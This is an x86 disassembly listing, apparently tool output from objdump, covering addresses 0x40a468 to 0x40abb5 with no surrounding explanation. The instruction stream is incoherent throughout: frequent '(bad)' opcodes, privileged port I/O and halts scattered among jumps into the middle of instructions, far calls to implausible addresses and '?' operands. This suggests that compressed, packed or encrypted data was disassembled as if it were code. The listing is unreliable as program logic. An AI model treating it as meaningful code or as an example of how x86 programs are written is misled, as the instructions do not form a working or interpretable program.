  40a468:	sbb    al,0x8
  40a46a:	fmul   DWORD PTR [esi+0x5a]
  40a46d:	retf   
  40a46e:	cld    
  40a46f:	fcmovnu st,st(1)
  40a471:	jl     0x40a45d
  40a473:	lea    edi,[eax-0x21]
  40a476:	dec    edi
  40a477:	(bad)  
  40a478:	int3   
  40a479:	(bad)  
  40a47a:	jb     0x40a421
  40a47c:	sbb    edi,ebp
  40a47e:	cld    
  40a47f:	stos   DWORD PTR es:[edi],eax
  40a480:	xchg   esp,eax
  40a481:	mov    DWORD PTR [esi-0x313668f1],ebx
  40a487:	enter  0x5732,0x7a
  40a48b:	call   0xe557d7c4
  40a490:	out    dx,al
  40a491:	jle    0x40a4ab
  40a493:	add    edi,DWORD PTR [edi]
  40a495:	fild   QWORD PTR [esi+edi*8-0x37a6f1eb]
  40a49c:	sbb    DWORD PTR [esi-0x228affde],esi
  40a4a2:	fild   WORD PTR [ecx-0x15]
  40a4a5:	and    ebx,DWORD PTR [esi-0x17]
  40a4a8:	addr16 inc ebp
  40a4aa:	js     0x40a4ad
  40a4ac:	mov    bl,0xcb
  40a4ae:	mov    eax,cs
  40a4b0:	fs popa 
  40a4b2:	in     al,dx
  40a4b3:	mov    bl,0xbc
  40a4b5:	fdiv   DWORD PTR [eax+0x4a]
  40a4b8:	in     eax,dx
  40a4b9:	mov    eax,ds:0x67487a82
  40a4be:	xchg   DWORD PTR [ecx-0x9c02059],edx
  40a4c4:	pop    esp
  40a4c5:	push   ebx
  40a4c6:	xchg   edi,eax
  40a4c7:	xchg   edi,eax
  40a4c8:	fst    QWORD PTR [ebx-0x60144c93]
  40a4ce:	jmp    0x40a4d3
  40a4d0:	outs   dx,BYTE PTR ds:[esi]
  40a4d1:	and    DWORD PTR [edi+0x7f],edi
  40a4d4:	add    bl,BYTE PTR [eax-0x11149730]
  40a4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4db:	mov    edi,0x76e89606
  40a4e0:	out    dx,al
  40a4e1:	sbb    eax,0x9cf50c25
  40a4e6:	or     al,0xb
  40a4e8:	test   eax,0x4f93c53f
  40a4ed:	ffreep st(7)
  40a4ef:	js     0x40a488
  40a4f1:	call   0x2d7e5a18
  40a4f6:	hlt    
  40a4f7:	retf   0x16c1
  40a4fa:	(bad)  
  40a4fb:	pop    ebp
  40a4fc:	imul   ebp,esp,0x1
  40a4ff:	loope  0x40a53f
  40a501:	inc    edx
  40a502:	retf   0xb9cb
  40a505:	in     al,0x9b
  40a507:	shl    BYTE PTR [esi+0x231ab027],0xc3
  40a50e:	xchg   ebp,eax
  40a50f:	nop
  40a510:	in     al,dx
  40a511:	sbb    BYTE PTR [ecx+0x438ff19b],ch
  40a517:	cmp    DWORD PTR [ebx],0x34
  40a51a:	adc    ecx,eax
  40a51c:	push   esp
  40a51d:	sbb    ebp,DWORD PTR [esi+edi*8-0x2]
  40a521:	and    ebp,DWORD PTR [eax+0x11]
  40a524:	call   DWORD PTR [ecx]
  40a526:	test   DWORD PTR [esp+ebp*1+0xd],esp
  40a52a:	jecxz  0x40a507
  40a52c:	sub    bl,0xbc
  40a52f:	cmp    DWORD PTR [ebx-0x21],esi
  40a532:	lahf   
  40a533:	leave  
  40a534:	mov    dl,0x27
  40a536:	xlat   BYTE PTR ds:[ebx]
  40a537:	int3   
  40a538:	int3   
  40a539:	bound  esp,QWORD PTR [ebx-0x35ce86e]
  40a53f:	jmp    0x869c9c9d
  40a544:	xor    BYTE PTR [eax-0x3a4037dc],0xce
  40a54b:	sub    ebx,ebx
  40a54d:	iret   
  40a54e:	mov    ch,0xce
  40a550:	jmp    0x40a4e2
  40a552:	rcr    BYTE PTR [esi],1
  40a554:	ror    BYTE PTR [ecx-0x2007be34],1
  40a55a:	pop    ecx
  40a55b:	or     ebp,DWORD PTR [esi-0x53]
  40a55e:	mov    eax,0xfd3551d6
  40a563:	inc    BYTE PTR ss:[ecx]
  40a566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a567:	xor    eax,0xc7eca5c3
  40a56c:	and    dl,0x2
  40a56f:	test   eax,0x702366ee
  40a574:	jmp    0x40a4ff
  40a576:	push   edx
  40a577:	mov    WORD PTR [ebx],?
  40a579:	addr16 xor dh,al
  40a57c:	xlat   BYTE PTR ds:[ebx]
  40a57d:	ffreep st(3)
  40a57f:	add    edx,DWORD PTR [ebx]
  40a581:	push   esi
  40a582:	into   
  40a583:	cmp    eax,esi
  40a585:	leave  
  40a586:	cld    
  40a587:	mov    eax,ds:0xb2edb7ee
  40a58c:	adc    eax,0xa632626f
  40a591:	(bad)  
  40a593:	fwait
  40a594:	xchg   esp,eax
  40a595:	add    edx,ebx
  40a597:	shl    ch,cl
  40a599:	push   ebp
  40a59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a59b:	inc    esi
  40a59c:	jmp    0x40a585
  40a59e:	sbb    ebp,DWORD PTR [edi+0x73b17b12]
  40a5a4:	or     bl,bh
  40a5a6:	mov    ah,0x53
  40a5a8:	imul   esp,DWORD PTR [ebp+0x43],0xffffff97
  40a5ac:	add    BYTE PTR [ecx],0xfd
  40a5af:	out    dx,eax
  40a5b0:	mov    DWORD PTR [ebp-0x62],eax
  40a5b3:	imul   eax,DWORD PTR [edi],0xbcc82d02
  40a5b9:	pop    ebp
  40a5ba:	call   0xe69a:0xccf8b800
  40a5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5c2:	or     dh,bh
  40a5c4:	inc    edi
  40a5c5:	sti    
  40a5c6:	ins    DWORD PTR es:[edi],dx
  40a5c7:	leave  
  40a5c8:	nop
  40a5c9:	stos   DWORD PTR es:[edi],eax
  40a5ca:	mov    eax,0xa0dcaf54
  40a5cf:	dec    eax
  40a5d0:	test   al,0x2e
  40a5d2:	mov    dl,BYTE PTR [ecx+0x63]
  40a5d5:	push   ebx
  40a5d6:	jmp    0x40a55f
  40a5d8:	jmp    0x40a64d
  40a5da:	cmp    al,0x59
  40a5dc:	fisub  DWORD PTR ss:0x5ba75d5b
  40a5e3:	retf   
  40a5e4:	jmp    0x5e32:0xa9fc0bdb
  40a5eb:	outs   dx,DWORD PTR ds:[esi]
  40a5ec:	jmp    DWORD PTR [edi]
  40a5ee:	mul    edx
  40a5f0:	jmp    0x40a593
  40a5f2:	mov    al,0xea
  40a5f4:	mov    eax,ds:0xa14fc47
  40a5f9:	fistp  QWORD PTR [esi+0x4b]
  40a5fc:	js     0x40a5e3
  40a5fe:	jmp    0x40a5f2
  40a600:	and    eax,0xf566fcd0
  40a605:	inc    esi
  40a606:	pop    ds
  40a607:	je     0x40a66c
  40a609:	shl    DWORD PTR [eax],0xc8
  40a60c:	in     al,0x1
  40a60e:	(bad)  
  40a60f:	bound  esp,QWORD PTR [edi]
  40a611:	inc    esp
  40a612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a613:	dec    ecx
  40a614:	or     DWORD PTR [edi-0x4a142f93],0x28
  40a61b:	cmp    al,0xbe
  40a61d:	lods   al,BYTE PTR ds:[esi]
  40a61e:	mov    dl,0xd4
  40a620:	out    dx,eax
  40a621:	fcompp 
  40a623:	jl     0x40a611
  40a625:	jns    0x40a63f
  40a627:	mov    WORD PTR [ebp-0x1],fs
  40a62a:	fld    QWORD PTR [edx]
  40a62c:	jmp    0x40a5f9
  40a62e:	pusha  
  40a62f:	adc    eax,0x68bb3cb2
  40a634:	push   ss
  40a635:	fild   QWORD PTR [ecx]
  40a637:	out    0x67,al
  40a639:	pop    es
  40a63a:	dec    edi
  40a63b:	pop    ebx
  40a63c:	add    BYTE PTR [ecx],cl
  40a63e:	ins    DWORD PTR es:[edi],dx
  40a63f:	aaa    
  40a640:	test   BYTE PTR [ecx],0x62
  40a643:	test   bl,ch
  40a645:	rcr    esp,1
  40a647:	sbb    eax,0xcb8c38f3
  40a64c:	test   BYTE PTR [edx],ch
  40a64e:	dec    edi
  40a64f:	pop    eax
  40a650:	repnz fldenv [edi+0x35]
  40a654:	sbb    ah,dl
  40a656:	test   BYTE PTR [eax],cl
  40a658:	dec    edi
  40a659:	pop    esi
  40a65a:	add    edx,ebx
  40a65c:	push   0x6e
  40a65e:	jge    0x40a6ba
  40a660:	fisub  WORD PTR [ebx-0x20ce1d94]
  40a666:	es dec ebp
  40a668:	cld    
  40a669:	aad    0x61
  40a66b:	jmp    0x40a609
  40a66d:	dec    esp
  40a66e:	add    al,BYTE PTR [edi-0x2b02773b]
  40a674:	sets   ch
  40a677:	fisub  DWORD PTR [edi+ebx*8]
  40a67a:	jne    0x40a66d
  40a67c:	pop    ds
  40a67d:	xor    dh,BYTE PTR [eax]
  40a67f:	mov    al,ds:0xc6fca406
  40a684:	cwde   
  40a685:	fld    QWORD PTR [esi]
  40a687:	js     0x40a642
  40a689:	(bad)  
  40a68a:	cdq    
  40a68b:	enter  0x1f4a,0x6a
  40a68f:	pusha  
  40a690:	dec    ecx
  40a691:	pusha  
  40a692:	arpl   WORD PTR [edi-0x7ae2bb15],cx
  40a698:	aad    0xd5
  40a69a:	mov    ds:0x10ea8ab1,al
  40a69f:	and    BYTE PTR [eax+0x77c2da9e],al
  40a6a5:	enter  0xa887,0x53
  40a6a9:	outs   dx,BYTE PTR ds:[esi]
  40a6aa:	std    
  40a6ab:	jp     0x40a6f2
  40a6ad:	aad    0xf5
  40a6af:	pushf  
  40a6b0:	pop    ss
  40a6b1:	inc    eax
  40a6b2:	jmp    0x40a67b
  40a6b4:	lods   al,BYTE PTR ds:[esi]
  40a6b5:	add    BYTE PTR [eax],ah
  40a6b7:	mov    bh,0x42
  40a6b9:	push   cs
  40a6ba:	call   0xb4b891c9
  40a6bf:	(bad)  
  40a6c0:	clc    
  40a6c1:	fsub   DWORD PTR [eax+0x7a]
  40a6c4:	jbe    0x40a6a4
  40a6c6:	sbb    DWORD PTR [ebp+0x67accce1],0x368443d7
  40a6d0:	jmp    0x40a724
  40a6d2:	mov    ecx,0xf3a57798
  40a6d7:	xor    BYTE PTR [ecx-0x21],ch
  40a6da:	lds    edx,FWORD PTR [esi]
  40a6dc:	hlt    
  40a6dd:	je     0x40a6ae
  40a6df:	mov    ?,WORD PTR [ebx-0x104e02e6]
  40a6e5:	ja     0x40a739
  40a6e7:	mov    edi,0xcfbc6c38
  40a6ec:	repz mov al,0xaa
  40a6ef:	fisttp WORD PTR [ebx+0x5a7b1173]
  40a6f5:	pop    es
  40a6f6:	std    
  40a6f7:	out    0x29,al
  40a6f9:	imul   ebp,eax,0xffffffaf
  40a6fc:	pop    eax
  40a6fd:	in     al,dx
  40a6fe:	mov    edi,cs
  40a700:	das    
  40a701:	cmp    al,BYTE PTR ds:[ebx]
  40a704:	retf   
  40a705:	push   0x4b
  40a707:	jge    0x40a769
  40a709:	lods   al,BYTE PTR ds:[esi]
  40a70a:	cld    
  40a70b:	into   
  40a70c:	adc    al,dh
  40a70e:	leave  
  40a70f:	shl    BYTE PTR [edi],cl
  40a711:	jecxz  0x40a78c
  40a713:	enter  0x505e,0x41
  40a717:	ror    ebx,0xa1
  40a71a:	into   
  40a71b:	push   ebx
  40a71c:	jmp    0x40a6d0
  40a71e:	test   al,0x2d
  40a720:	inc    ebp
  40a721:	arpl   WORD PTR [edi+0x22],bx
  40a724:	sub    edi,ebx
  40a726:	fcmovbe st,st(7)
  40a728:	sbb    eax,0x634c43d
  40a72d:	mov    al,ds:0xe1eb84a8
  40a732:	idiv   BYTE PTR [ebp-0x7d]
  40a735:	inc    edx
  40a736:	and    DWORD PTR [ebp+0x5d],esp
  40a739:	int    0xe
  40a73b:	enter  0xfad1,0x6e
  40a73f:	xor    ch,BYTE PTR [edx-0x15906350]
  40a745:	push   cs
  40a746:	retw   
  40a748:	dec    edx
  40a749:	sub    BYTE PTR [eax+ebx*2-0x695d8d01],dh
  40a750:	neg    bh
  40a752:	mov    BYTE PTR [ecx-0x51],bl
  40a755:	(bad)  
  40a756:	mov    dl,0x6a
  40a758:	leave  
  40a759:	ss std 
  40a75b:	pop    ebx
  40a75c:	scas   al,BYTE PTR es:[edi]
  40a75d:	lahf   
  40a75e:	pop    eax
  40a75f:	cli    
  40a760:	xchg   ecx,eax
  40a761:	out    0x56,al
  40a763:	enter  0xafde,0x5c
  40a767:	mov    ds:0x69ccee58,eax
  40a76c:	jmp    0x40a78b
  40a76e:	pop    eax
  40a76f:	xchg   ecx,eax
  40a770:	nop
  40a771:	or     esi,DWORD PTR [ebp-0x6d]
  40a774:	je     0x40a755
  40a776:	das    
  40a777:	cmp    DWORD PTR [edi],edx
  40a779:	daa    
  40a77a:	xchg   DWORD PTR ds:0xa6ff9df5,esp
  40a780:	and    eax,0x6667cd15
  40a785:	push   ds
  40a786:	xor    ebx,DWORD PTR [esi-0x37fbdfe9]
  40a78c:	xchg   ecx,eax
  40a78d:	sahf   
  40a78e:	ja     0x40a7f0
  40a790:	mov    eax,ds:0xebfc256d
  40a795:	rol    edx,cl
  40a797:	inc    esi
  40a798:	dec    ebx
  40a799:	rcr    DWORD PTR [eax+0x4c],1
  40a79c:	stos   DWORD PTR es:[edi],eax
  40a79d:	addr16 or al,0xc9
  40a7a0:	dec    eax
  40a7a1:	push   0x9c820cb6
  40a7a6:	or     eax,0xfcebe004
  40a7ab:	adc    edi,DWORD PTR cs:[edx-0x59]
  40a7af:	lods   eax,DWORD PTR ds:[esi]
  40a7b0:	xchg   ebx,eax
  40a7b1:	shl    esi,0xc7
  40a7b4:	je     0x40a833
  40a7b6:	les    ebx,FWORD PTR [eax+0x32d8dd0c]
  40a7bc:	popf   
  40a7bd:	add    ebp,edi
  40a7bf:	mov    cl,0xdd
  40a7c1:	jecxz  0x40a837
  40a7c3:	rol    BYTE PTR fs:[ebx-0x53],1
  40a7c7:	enter  0xd430,0x77
  40a7cb:	out    0xdb,eax
  40a7cd:	vhaddps xmm5,xmm2,xmm3
  40a7d1:	mov    dh,0xc9
  40a7d3:	ficom  DWORD PTR [eax]
  40a7d5:	out    dx,al
  40a7d6:	mov    bl,0x93
  40a7d8:	(bad)
  40a7db:	out    dx,eax
  40a7dc:	or     eax,0x753c4080
  40a7e1:	mov    ebp,0x165200fc
  40a7e6:	add    ecx,ebp
  40a7e8:	or     al,0xfb
  40a7ea:	pop    ecx
  40a7eb:	xchg   ebp,eax
  40a7ec:	and    al,0xd8
  40a7ee:	mov    dh,0xe
  40a7f0:	ror    BYTE PTR [esi-0x5ea1773d],0xd2
  40a7f7:	dec    esp
  40a7f8:	jne    0x40a7e8
  40a7fa:	repnz inc ecx
  40a7fc:	jl     0x40a861
  40a7fe:	imul   ebp,DWORD PTR [ecx+0x3c84b5bc],0x1c560f1b
  40a808:	daa    
  40a809:	int    0x9
  40a80b:	fmulp  st(6),st
  40a80d:	je     0x40a80c
  40a80f:	push   edi
  40a810:	adc    ch,BYTE PTR ds:0xe01c2f7a
  40a816:	cld    
  40a817:	pcmpeqb mm0,mm7
  40a81a:	pop    esp
  40a81b:	mul    DWORD PTR [ecx+0x37cb1b1a]
  40a821:	sahf   
  40a822:	xlat   BYTE PTR ds:[ebx]
  40a823:	sub    BYTE PTR [ebp-0x31],bh
  40a826:	ins    BYTE PTR es:[edi],dx
  40a827:	dec    ebp
  40a828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a829:	cmp    bh,ch
  40a82b:	mov    dh,0x27
  40a82d:	mov    esi,0xfee7eb28
  40a832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a833:	enter  0xa959,0x93
  40a837:	imul   BYTE PTR [ebx]
  40a839:	sub    ch,ah
  40a83b:	or     ebx,ebp
  40a83d:	and    bh,al
  40a83f:	cli    
  40a840:	loope  0x40a7c2
  40a842:	xchg   DWORD PTR [ebx-0x1f4c236f],esi
  40a848:	xchg   esi,eax
  40a849:	push   ds
  40a84a:	enter  0xe616,0xdb
  40a84e:	cwde   
  40a84f:	pushf  
  40a850:	xchg   DWORD PTR [edx+0x42d0295d],ecx
  40a856:	and    al,0xcf
  40a858:	fmul   DWORD PTR ds:0x8d6be428
  40a85e:	sub    DWORD PTR [esi],ebp
  40a860:	call   0xeb5f:0x4663fcac
  40a867:	xchg   edi,eax
  40a868:	dec    edx
  40a869:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86b:	enter  0x1ab2,0xec
  40a86f:	pop    ss
  40a870:	in     al,dx
  40a871:	mov    BYTE PTR [edi+0x2f7eba3],al
  40a877:	hlt    
  40a878:	adc    dh,al
  40a87a:	push   ss
  40a87b:	mov    edx,0x8205df95
  40a880:	and    al,dl
  40a882:	dec    edx
  40a883:	sub    dl,BYTE PTR [esi+eax*1-0x65]
  40a887:	sub    ebx,0xffffff87
  40a88a:	mov    ch,0xe0
  40a88c:	ffreep st(5)
  40a88e:	std    
  40a88f:	inc    eax
  40a890:	jno    0x40a871
  40a892:	mov    cl,0xe9
  40a894:	vcmpss xmm5,xmm4,xmm2,0x51
  40a899:	call   0x21f4b791
  40a89e:	int    0xc8
  40a8a0:	pop    esp
  40a8a1:	dec    edi
  40a8a2:	inc    ebp
  40a8a3:	mov    ecx,DWORD PTR [esi]
  40a8a5:	(bad)  
  40a8a7:	(bad)  
  40a8a8:	out    0xd0,eax
  40a8aa:	outs   dx,BYTE PTR ds:[esi]
  40a8ab:	leave  
  40a8ac:	lock mov bh,0xff
  40a8af:	mov    ah,0xdc
  40a8b1:	mov    eax,0x6fb2c6bf
  40a8b6:	fdiv   QWORD PTR ds:0xa5b5eb06
  40a8bc:	mov    bl,0x9f
  40a8be:	dec    ebp
  40a8bf:	int3   
  40a8c0:	and    eax,0xebe40a36
  40a8c5:	jle    0x40a87f
  40a8c7:	test   al,0xb5
  40a8c9:	add    eax,0x49c86b92
  40a8ce:	push   ss
  40a8cf:	enter  0x69cb,0x77
  40a8d3:	or     al,0x6b
  40a8d5:	push   cs
  40a8d6:	outs   dx,DWORD PTR ds:[esi]
  40a8d7:	jne    0x40a8b6
  40a8d9:	jg     0x40a89a
  40a8db:	mov    edi,0xc8a1ba7c
  40a8e0:	push   esi
  40a8e1:	push   esi
  40a8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8e3:	imul   edx,DWORD PTR [ecx+ebp*1+0x3d0dc869],0x28159ba2
  40a8ee:	mov    ecx,0x7d73e92f
  40a8f3:	into   
  40a8f4:	cmc    
  40a8f5:	dec    ecx
  40a8f6:	sbb    al,0x88
  40a8f8:	pop    es
  40a8f9:	jo     0x40a910
  40a8fb:	xor    dl,ch
  40a8fd:	fistp  QWORD PTR [ebx+edi*8+0x6685cf58]
  40a904:	add    edi,DWORD PTR [esp+esi*8]
  40a907:	xchg   dh,cl
  40a909:	test   DWORD PTR ds:0xcde0a6df,ebx
  40a90f:	lahf   
  40a910:	retf   
  40a911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a912:	mov    dl,ch
  40a914:	mov    al,ds:0x9d53badc
  40a919:	shr    edx,cl
  40a91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a91c:	cmp    edi,DWORD PTR [eax]
  40a91e:	adc    cl,BYTE PTR [ebp+ebp*8+0x529fff16]
  40a925:	mov    edi,0x7f872a1b
  40a92a:	add    al,0xc8
  40a92c:	sub    DWORD PTR [edx+0x44],edi
  40a92f:	push   esi
  40a930:	ss loop 0x40a964
  40a933:	aaa    
  40a934:	jmp    0x40a92e
  40a936:	mov    cl,0x2e
  40a938:	popf   
  40a939:	inc    ebp
  40a93a:	fisub  DWORD PTR [ebp+0x41]
  40a93d:	jmp    0x40a9a8
  40a93f:	sbb    bh,BYTE PTR ds:0xbac3ea0
  40a945:	in     al,dx
  40a946:	test   BYTE PTR [ecx+0x32172c1b],dh
  40a94c:	mov    ebx,0xeb26b2f7
  40a951:	pop    esi
  40a952:	mov    dh,0x6e
  40a954:	daa    
  40a955:	out    0x58,al
  40a957:	mov    edx,DWORD PTR [ecx-0x21]
  40a95a:	in     eax,0xbb
  40a95c:	and    esi,DWORD PTR [edi-0x1fc92296]
  40a962:	std    
  40a963:	or     ch,BYTE PTR [ebx-0x1e]
  40a966:	(bad)  
  40a967:	(bad)  
  40a968:	jg     0x40a92c
  40a96a:	test   al,0x5
  40a96c:	xchg   edi,ebx
  40a96e:	xor    DWORD PTR [esi],edi
  40a970:	cmp    DWORD PTR [ebx+0x2200fee],ebp
  40a976:	std    
  40a977:	enter  0x2e6e,0x43
  40a97b:	jnp    0x40a9a8
  40a97d:	(bad)  
  40a97e:	test   bh,0xc3
  40a981:	dec    eax
  40a982:	ins    BYTE PTR es:[edi],dx
  40a983:	mov    bl,BYTE PTR [esi+0x3c]
  40a986:	(bad)  
  40a987:	push   ebp
  40a988:	jmp    0x40a9a6
  40a98a:	bnd jae 0x40a993
  40a98d:	ins    DWORD PTR es:[edi],dx
  40a98e:	stc    
  40a98f:	imul   ecx,DWORD PTR [ebp-0x21],0xffffff82
  40a993:	jb     0x40a93d
  40a995:	mov    ds:0x938f4681,eax
  40a99a:	pop    esi
  40a99b:	ds sub ecx,edi
  40a99e:	mov    ds:0xd2c71741,eax
  40a9a3:	jmp    0xbe3e31db
  40a9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a9:	loope  0x40a9cc
  40a9ab:	loopne 0x40a9ae
  40a9ad:	loopne 0x40a937
  40a9af:	xchg   ebp,eax
  40a9b0:	xchg   esp,eax
  40a9b1:	push   ebx
  40a9b2:	test   al,0x3e
  40a9b4:	jg     0x40aa33
  40a9b6:	std    
  40a9b7:	sbb    al,BYTE PTR [edi-0x25]
  40a9ba:	addr16 or eax,0xa002a9e6
  40a9c0:	loopne 0x40a9a1
  40a9c2:	and    ch,dh
  40a9c4:	or     al,0xae
  40a9c6:	inc    ebp
  40a9c7:	fwait
  40a9c8:	repz mov bh,ch
  40a9cb:	or     DWORD PTR [esi-0x2d],edx
  40a9ce:	mov    ch,0xa3
  40a9d0:	loope  0x40aa0f
  40a9d2:	jns    0x40a99c
  40a9d4:	outs   dx,BYTE PTR ds:[esi]
  40a9d5:	pop    es
  40a9d6:	popa   
  40a9d7:	push   es
  40a9d8:	div    DWORD PTR [eax-0x351459cf]
  40a9de:	aaa    
  40a9df:	(bad)  
  40a9e0:	out    0x91,eax
  40a9e2:	test   al,ch
  40a9e4:	mov    cl,0xdf
  40a9e6:	jno    0x40a9a9
  40a9e8:	xor    al,0x99
  40a9ea:	shr    esp,cl
  40a9ec:	adc    BYTE PTR [esi-0x2419305c],ah
  40a9f2:	sbb    cl,BYTE PTR [eax]
  40a9f4:	cmc    
  40a9f5:	pusha  
  40a9f6:	sbb    eax,0xeae570b9
  40a9fb:	int    0x3
  40a9fd:	fs jmp 0xc4b4d516
  40aa03:	xchg   edx,eax
  40aa04:	pop    ecx
  40aa05:	sti    
  40aa06:	cld    
  40aa07:	mov    BYTE PTR [ecx+0x1951e306],al
  40aa0d:	repz jns 0x40a9da
  40aa10:	jne    0x40aa41
  40aa12:	cmc    
  40aa13:	mov    edx,0x511e22b3
  40aa18:	ret    
  40aa19:	aaa    
  40aa1a:	adc    dh,bl
  40aa1c:	jmp    0x40aa9b
  40aa1e:	sar    DWORD PTR [bp+di-0x30],cl
  40aa22:	int    0xa0
  40aa24:	lods   al,BYTE PTR ds:[esi]
  40aa25:	jmp    0xaa8173bd
  40aa2a:	pop    ds
  40aa2b:	pop    es
  40aa2c:	pop    ebx
  40aa2d:	pusha  
  40aa2e:	stos   BYTE PTR es:[edi],al
  40aa2f:	push   0xffffffcd
  40aa31:	jns    0x40a9b3
  40aa33:	std    
  40aa34:	and    DWORD PTR [esi+0x5d],ebx
  40aa37:	je     0x40aa82
  40aa39:	mov    bh,ch
  40aa3b:	es lahf 
  40aa3d:	mov    edx,0x81b070a2
  40aa42:	push   edi
  40aa43:	enter  0x536a,0x48
  40aa47:	inc    edi
  40aa48:	add    esi,0xeaeb2f89
  40aa4e:	mov    gs,WORD PTR [edx+0xc]
  40aa51:	out    dx,eax
  40aa52:	xchg   edi,eax
  40aa53:	add    al,0x7a
  40aa55:	dec    edi
  40aa56:	clc    
  40aa57:	mov    eax,DWORD PTR [ebx]
  40aa59:	pusha  
  40aa5a:	std    
  40aa5b:	adc    eax,0x54db9417
  40aa60:	inc    ebx
  40aa61:	mov    ebp,edi
  40aa63:	mov    ah,0xf5
  40aa65:	repz xor eax,0x55b6f031
  40aa6b:	leave  
  40aa6c:	repnz pop ss
  40aa6e:	sub    dl,BYTE PTR [edx-0x573fb605]
  40aa74:	dec    eax
  40aa75:	hlt    
  40aa76:	lods   al,BYTE PTR ds:[esi]
  40aa77:	sbb    bl,BYTE PTR [edi]
  40aa79:	outs   dx,DWORD PTR ds:[esi]
  40aa7a:	std    
  40aa7b:	inc    ebx
  40aa7c:	sbb    BYTE PTR [eax+0x6611c2e7],ch
  40aa82:	mov    bh,0xc8
  40aa84:	aas    
  40aa85:	adc    al,0x8c
  40aa87:	aam    0x4d
  40aa89:	cmp    eax,0x46eba1f6
  40aa8e:	icebp  
  40aa8f:	cli    
  40aa90:	xchg   edx,eax
  40aa91:	ret    0xa390
  40aa94:	(bad)  
  40aa95:	les    edi,FWORD PTR [ebx]
  40aa97:	enter  0xb0bd,0xb5
  40aa9b:	aas    
  40aa9c:	xchg   BYTE PTR [edx],cl
  40aa9e:	dec    edx
  40aa9f:	mov    edx,0xf9f380e6
  40aaa4:	retf   0xccb6
  40aaa7:	ret    0x1950
  40aaaa:	(bad)
  40aaad:	pop    eax
  40aaae:	push   esp
  40aaaf:	pop    esp
  40aab0:	imul   edi,DWORD PTR [edx],0xffffff84
  40aab3:	scas   eax,DWORD PTR es:[edi]
  40aab4:	out    0x6d,al
  40aab6:	dec    ecx
  40aab7:	mov    ds:0x795001d5,al
  40aabc:	push   0x1edf42df
  40aac1:	jecxz  0x40ab38
  40aac3:	std    
  40aac4:	jp     0x40aabd
  40aac6:	stos   DWORD PTR es:[edi],eax
  40aac7:	hlt    
  40aac8:	pop    ebx
  40aac9:	fdiv   st(2),st
  40aacb:	aas    
  40aacc:	test   cl,bl
  40aace:	add    BYTE PTR [edx-0x6f2df725],bh
  40aad4:	call   0xf5e60e45
  40aad9:	pop    edi
  40aada:	push   ebp
  40aadb:	xchg   esp,eax
  40aadc:	add    bl,BYTE PTR [ebx+0xc]
  40aadf:	inc    edi
  40aae0:	test   eax,0xe877fcfd
  40aae5:	dec    ebx
  40aae6:	in     eax,dx
  40aae7:	je     0x40ab02
  40aae9:	fbld   TBYTE PTR [eax]
  40aaeb:	fsubr  QWORD PTR [ecx-0x69]
  40aaee:	jmp    0x40aaa6
  40aaf0:	mov    ch,0x1c
  40aaf2:	in     eax,0xbc
  40aaf4:	mov    esp,0xd5e20adf
  40aaf9:	inc    esp
  40aafa:	shl    DWORD PTR [ecx-0x366931a3],0x4
  40ab01:	out    dx,al
  40ab02:	fst    st(1)
  40ab04:	jnp    0x40ab70
  40ab06:	jl     0x40ab34
  40ab08:	test   BYTE PTR [eax],0xfd
  40ab0b:	bound  edi,QWORD PTR [ebx+0x523a2a47]
  40ab11:	loope  0x40aaed
  40ab13:	enter  0x4c70,0x22
  40ab17:	pop    es
  40ab18:	hlt    
  40ab19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab1a:	push   edx
  40ab1b:	and    dh,bl
  40ab1d:	jl     0x40ab1c
  40ab1f:	sbb    al,0x92
  40ab21:	dec    edi
  40ab22:	xor    DWORD PTR [esi],eax
  40ab24:	mov    eax,ds:0xc2be0026
  40ab29:	pop    edx
  40ab2a:	mov    WORD PTR [eax-0x7a066004],cs
  40ab30:	out    dx,al
  40ab31:	pop    eax
  40ab32:	gs shr bl,cl
  40ab35:	mov    esp,0x6c9d34f6
  40ab3a:	cmc    
  40ab3b:	mov    eax,ds:0x8eb8df85
  40ab40:	popa   
  40ab41:	int    0x17
  40ab43:	out    dx,eax
  40ab44:	(bad)  
  40ab45:	push   esp
  40ab46:	repz imul edi,eax,0xffffff8e
  40ab4a:	rol    bh,cl
  40ab4c:	fsubr  DWORD PTR [eax-0x2085e39e]
  40ab52:	add    al,0x6a
  40ab54:	out    0x5f,eax
  40ab56:	pop    es
  40ab57:	push   ecx
  40ab58:	and    edx,DWORD PTR [ecx-0x1e]
  40ab5b:	retf   
  40ab5c:	test   al,0x47
  40ab5e:	add    al,0x4b
  40ab60:	(bad)  
  40ab61:	sti    
  40ab62:	std    
  40ab63:	das    
  40ab64:	mov    ch,0xf1
  40ab66:	adc    dh,BYTE PTR [ebp-0x55]
  40ab69:	jns    0x40abe6
  40ab6b:	mov    ah,0x40
  40ab6d:	fistp  WORD PTR [esi-0x75c6a58e]
  40ab73:	les    esp,FWORD PTR [ecx]
  40ab75:	imul   ebp,DWORD PTR [edi+0x70aef1c3],0xfd3b2950
  40ab7f:	je     0x40aba1
  40ab81:	lea    edi,[esp+esi*4]
  40ab84:	inc    ebx
  40ab85:	fisttp WORD PTR [ebx-0x1e6f5f10]
  40ab8b:	adc    eax,0x83f3877f
  40ab90:	push   ds
  40ab91:	xchg   edi,eax
  40ab92:	dec    ecx
  40ab93:	mov    BYTE PTR ds:0x5542440,cl
  40ab99:	sti    
  40ab9a:	mov    edi,0x7e06e75d
  40ab9f:	mov    BYTE PTR [ebx+0x56],al
  40aba2:	and    ebp,edi
  40aba4:	pop    ds
  40aba5:	iret   
  40aba6:	and    BYTE PTR [edx-0x685fe916],ch
  40abac:	jo     0x40abeb
  40abae:	xchg   esp,eax
  40abaf:	dec    eax
  40abb0:	in     al,0x19
  40abb2:	(bad)  
  40abb3:	loop   0x40ac2e
  40abb5:	imul   edi,ebp,0x497fc0c
